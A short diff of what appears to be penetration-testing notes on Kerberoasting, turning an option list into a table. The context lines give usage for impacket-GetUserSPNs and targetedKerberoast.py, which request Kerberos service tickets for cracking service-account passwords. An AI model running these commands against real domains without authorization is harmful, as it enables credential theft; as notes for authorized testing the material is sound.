@@ -35,10 +35,13 @@ impacket-GetUserSPNs -request -dc-ip target_ip domain_name/user
 
 - After identifying the target SPNs, you can use the script to request TGS tickets for those service accounts.
 
-- `-u`: Username for authentication
-- `-p`: Password for the user
-- `-d`: Domain of the target network
-- `-t`: Target SPN (the service account you want to target)
+| Option    | Description |
+|-----------|-------------|
+| **`-u`**  | Username for authentication. |
+| **`-p`**  | Password for the user. |
+| **`-d`**  | Domain of the target network. |
+| **`-t`**  | Target SPN (the service account you want to target). |
+
 
 ```bash
 python targetedKerberoast.py -u <username> -p <password> -d <domain> -t <target_spn>
